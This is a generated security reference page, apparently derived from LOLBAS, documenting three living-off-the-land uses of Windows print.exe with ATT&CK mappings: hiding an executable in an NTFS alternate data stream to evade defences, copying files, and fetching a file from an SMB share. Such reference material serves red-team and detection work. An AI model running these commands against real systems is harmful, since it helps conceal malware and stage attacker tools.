---
parsed_by: focuslocust
source: commands
type: generated
---
# Print Commands

[Home](../../../README.md)

> This page contains security testing commands. Use only in authorised environments.

## Print.exe

Tool page: [Print.exe](../../tools/windows/print.exe.md)

### Hide binary file in alternate data stream to potentially bypass defensive counter measures

```text
print /D:{PATH_ABSOLUTE}:file.exe {PATH_ABSOLUTE:.exe}
```

Description:

Copy file.exe into the Alternate Data Stream (ADS) of file.txt.

Related ATT&CK:

- [T1564.004](../../attack/techniques/T1564.004-ntfs-file-attributes.md)

Provenance:

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSBinaries/Print.yml` |
| Evidence | Command preserved from source parser. |

### Copy files

```text
print /D:{PATH_ABSOLUTE:.dest.exe} {PATH_ABSOLUTE:.source.exe}
```

Description:

Copy file from source to destination

Related ATT&CK:

- [T1105](../../attack/techniques/T1105-ingress-tool-transfer.md)

Provenance:

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSBinaries/Print.yml` |
| Evidence | Command preserved from source parser. |

### Copy/Download file from remote server

```text
print /D:{PATH_ABSOLUTE:.dest.exe} {PATH_SMB:.source.exe}
```

Description:

Copy File.exe from a network share to the target c:\OutFolder\outfile.exe.

Related ATT&CK:

- [T1105](../../attack/techniques/T1105-ingress-tool-transfer.md)

Provenance:

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSBinaries/Print.yml` |
| Evidence | Command preserved from source parser. |
